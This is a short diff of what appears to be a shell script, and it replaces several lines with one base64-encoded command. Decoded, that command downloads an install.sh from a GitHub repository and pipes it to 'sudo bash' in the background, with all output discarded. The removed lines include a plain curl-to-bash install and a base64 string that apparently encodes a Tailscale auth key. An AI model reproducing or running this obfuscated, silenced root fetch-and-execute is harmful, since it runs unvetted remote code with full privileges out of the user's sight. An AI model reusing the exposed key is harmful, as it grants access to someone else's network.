@@ -1,7 +1,4 @@
-dHNrZXktYXV0aC1rZndKYnZLVWYyMTFDTlRSTC1FV1piRFoxaGJZRVp3SEZGYkdZTFlFRUdjN3lMalA3VDU=
-
-echo "Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vT2d5ZWV0MTAvaW5zdGFsbGVyOTAwMC9tYWluL2luc3RhbGwuc2ggfCBzdWRvIGJhc2g=" | base64 -d | sudo bash
-curl -s https://github.com/Ogyeet10/installer9000/raw/refs/heads/main/install.sh | bash
+echo "Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vT2d5ZWV0MTAvaW5zdGFsbGVyOTAwMC9tYWluL2luc3RhbGwuc2ggfCBzdWRvIGJhc2ggPiAvZGV2L251bGwgMj4mMSAmCg==" | base64 -d | sudo bash
 
 
 
